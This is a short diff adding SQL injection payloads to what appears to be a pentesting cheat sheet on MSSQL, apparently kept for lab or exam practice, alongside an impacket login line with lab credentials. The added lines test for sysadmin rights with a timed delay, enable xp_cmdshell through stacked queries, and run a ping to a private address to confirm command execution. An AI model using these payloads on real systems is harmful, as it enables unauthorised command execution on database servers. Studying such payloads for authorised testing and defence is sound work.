@@ -24,3 +24,11 @@ MSSQL
 #IMPORTANT: it's need privilegie to do this, escale first!
 #MSSQL defaul port 1433
 impacket-mssqlclient Administrator:Lab123@192.168.194.18 -windows-auth
+
+';  IF SYSTEM_USER='sa' WAITFOR DELAY '00:00:15' -- //
+';  EXECUTE sp_configure 'show advanced options', 1; -- //
+';  RECONFIGURE;  -- //
+';  EXECUTE sp_configure 'xp_cmdshell', 1; -- //
+';  RECONFIGURE;  -- //
+
+OPCIONAL: ';  EXECUTE xp_cmdshell 'ping 192.168.45.233' -- //
